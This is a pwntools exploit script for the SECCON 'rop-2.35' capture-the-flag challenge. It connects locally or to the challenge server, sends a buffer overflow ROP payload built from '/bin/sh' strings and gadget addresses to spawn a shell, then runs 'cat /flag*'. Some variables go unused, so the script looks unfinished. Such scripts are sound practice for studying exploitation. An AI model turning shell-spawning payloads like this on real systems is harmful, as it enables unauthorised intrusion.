from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = 'amd64'
pty = process.PTY
is_local = False

elf = ELF("/home/kali/CTF/SECCON/rop-2.35/chall_patched")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    #  nc rop-2-35.seccon.games 9999
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug(cmd='''
	set follow-fork-mode parent
        b *main + 46
      ''')

offset = 24
system_address = elf.symbols["system"]
gets_address = elf.symbols["gets"]
writable_data_address = p64(0x0000000000404028)

log.info("System plt: " + hex(system_address))
print(p.recvuntilS("Enter something:\n"))


payload = b"/bin/sh\0\0" + b"/bin/p" + b"/bin/pwd\0"
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401169)
p.sendline(payload)
p.sendline("cat /flag*")
p.interactive()
